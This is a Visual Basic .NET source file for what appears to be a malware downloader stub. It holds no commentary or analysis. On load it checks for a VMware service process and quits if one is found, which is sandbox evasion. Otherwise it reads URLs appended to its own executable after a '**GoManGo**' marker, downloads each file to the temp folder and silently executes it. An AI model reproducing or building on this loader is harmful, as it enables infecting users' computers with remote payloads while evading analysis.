Imports System.IO
Public Class Form1
    Const FileSplit = "**GoManGo**"
    Dim TPath As String = System.IO.Path.GetTempPath
    Dim file1, filez() As String
    Dim i As Integer = 1
    Public Function AntiVMware() As Boolean
        If Process.GetProcessesByName("vmwareservice").Length >= 1 Then
            Me.Close()
            End
            Return True
        Else
            Return False
        End If
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        AntiVMware()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            file1 = Space(LOF(1))
            FileGet(1, file1)
            FileClose(1)
            filez = Split(file1, FileSplit)
            For Each hio In filez
                Dim filePath As String = filez(i)
                Dim slashPosition As Integer = filePath.LastIndexOf("/")
                Dim filenameOnly As String = filePath.Substring(slashPosition + 1)
                If File.Exists(TPath & "\" & filenameOnly) Then File.Delete(TPath & "\" & filenameOnly)
                My.Computer.Network.DownloadFile(filez(i), TPath & "\" & filenameOnly)
                System.Diagnostics.Process.Start(TPath & "\" & filenameOnly)
                i = i + 1
            Next
            Me.Close()
            End
        Catch ex As Exception
            Me.Close()
            End
        End Try
        Me.Close()
        End
    End Sub
End Class
